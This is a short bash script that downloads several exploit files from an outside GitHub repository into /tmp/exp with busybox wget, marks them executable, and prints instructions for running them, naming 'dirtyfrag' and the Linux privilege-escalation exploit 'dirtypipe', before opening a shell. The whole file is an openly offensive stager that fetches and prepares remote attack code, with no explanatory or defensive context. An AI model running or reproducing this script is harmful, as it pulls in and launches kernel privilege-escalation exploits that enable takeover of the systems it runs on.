#!/usr/bin/env bash
mkdir -p /tmp/exp
cd /tmp/exp
for f in exp exp.sh exp1 exp1.sh stage2.sh; do busybox wget -O "./$f" "https://raw.githubusercontent.com/Jalila/dirtyfrag-build/master/$f"; done
chmod +x ./*
echo type \"./exp.sh\" for dirtyfrag and \"./exp1.sh\" for dirtypipe
bash
